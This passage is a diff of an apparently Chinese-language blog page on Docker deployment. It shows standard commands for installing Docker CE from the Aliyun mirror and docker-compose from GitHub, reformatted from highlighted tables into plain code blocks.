 <h1 id="4-docker部署"><a href="#4-docker部署" class="headerlink" title="4 docker部署"></a>4 docker部署</h1><h2 id="4-1-安装docker"><a href="#4-1-安装docker" class="headerlink" title="4.1 安装docker"></a>4.1 安装docker</h2><p>在ubuntu中可以使用apt-get的方式进行安装，具体安装命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 1: 安装必要的一些系统工具</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common</span><br><span class="line"><span class="comment"># step 2: 安装GPG证书</span></span><br><span class="line">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"><span class="comment"># Step 3: 写入软件源信息</span></span><br><span class="line">sudo add-apt-repository <span class="string">"deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br><span class="line"><span class="comment"># Step 4: 更新并安装 Docker-CE</span></span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get -y install docker-ce</span><br></pre></td></tr></table></figure>
+<pre><code class="bash"># step 1: 安装必要的一些系统工具
+sudo apt-get update
+sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common
+# step 2: 安装GPG证书
+curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -
+# Step 3: 写入软件源信息
+sudo add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;
+# Step 4: 更新并安装 Docker-CE
+sudo apt-get -y update
+sudo apt-get -y install docker-ce
+</code></pre>
 <h2 id="4-2-安装docker-compose"><a href="#4-2-安装docker-compose" class="headerlink" title="4.2 安装docker-compose"></a>4.2 安装docker-compose</h2><p>由于本次部署不止一个服务，所以为了避免多次编写dockerfile和多次启动，选择使用docker-compose进行部署，安装过程如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装docker-compose</span></span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
+<pre><code class="bash"># 安装docker-compose
+sudo curl -L https://github.com/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
+# 赋予执行权限
+sudo chmod +x /usr/local/bin/docker-compose
+</code></pre>
 <h2 id="4-3-部署启动"><a href="#4-3-部署启动" class="headerlink" title="4.3 部署启动"></a>4.3 部署启动</h2><p>在部署前我们需要写相应的脚本，包括：</p>
 <ul>
 <li><p>PHP相关配置（php目录下）: Dockerfile、php.ini、php-fpm.conf</p>
